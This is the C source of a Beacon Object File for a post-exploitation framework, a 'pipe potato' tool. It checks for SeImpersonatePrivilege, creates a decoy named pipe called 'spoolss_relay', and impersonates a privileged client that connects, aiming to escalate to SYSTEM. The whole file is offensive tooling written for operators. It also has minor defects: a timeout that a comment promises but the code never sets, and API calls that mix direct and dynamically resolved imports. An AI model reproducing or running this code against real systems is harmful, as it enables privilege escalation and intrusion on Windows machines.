/*
 * pipe_potato.c - Named pipe potato (SeImpersonate to SYSTEM)
 * Creates named pipe, waits for privileged process, impersonates
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$ConnectNamedPipe(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI ADVAPI32$ImpersonateNamedPipeClient(HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Pipe Potato (SeImpersonate) ===");

    /* Check if we have SeImpersonatePrivilege */
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD retLen = 0;
        GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &retLen);
        if (retLen > 0) {
            PTOKEN_PRIVILEGES pPriv = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), 0, retLen);
            if (pPriv && GetTokenInformation(hToken, TokenPrivileges, pPriv, retLen, &retLen)) {
                int hasImpersonate = 0;
                for (DWORD i = 0; i < pPriv->PrivilegeCount; i++) {
                    /* SeImpersonatePrivilege LUID = 20 */
                    if (pPriv->Privileges[i].Luid.LowPart == 20 && (pPriv->Privileges[i].Attributes & 0x2)) {
                        hasImpersonate = 1;
                        break;
                    }
                }
                if (!hasImpersonate) {
                    BeaconPrintf(CALLBACK_OUTPUT, "SeImpersonatePrivilege NOT enabled");
                    BeaconPrintf(CALLBACK_OUTPUT, "Pipe potato will not work");
                    HeapFree(GetProcessHeap(), 0, pPriv);
                    CloseHandle(hToken);
                    return;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "SeImpersonatePrivilege: ENABLED");
                HeapFree(GetProcessHeap(), 0, pPriv);
            }
        }
        CloseHandle(hToken);
    }

    /* Create named pipe */
    char pipeName[] = "\\\\.\\pipe\\spoolss_relay";
    HANDLE hPipe = KERNEL32$CreateNamedPipeA(pipeName,
        PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to create named pipe");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Named pipe created: %s", pipeName);
    BeaconPrintf(CALLBACK_OUTPUT, "Waiting for privileged process to connect...");

    /* Wait for connection (with timeout) */
    if (KERNEL32$ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
        BeaconPrintf(CALLBACK_OUTPUT, "Client connected to pipe");

        if (ADVAPI32$ImpersonateNamedPipeClient(hPipe)) {
            BeaconPrintf(CALLBACK_OUTPUT, "Impersonation successful!");
            BeaconPrintf(CALLBACK_OUTPUT, "Token captured (use token_scan to verify)");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Impersonation failed (error %lu)", GetLastError());
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "No client connected (timeout)");
    }

    KERNEL32$CloseHandle(hPipe);
}
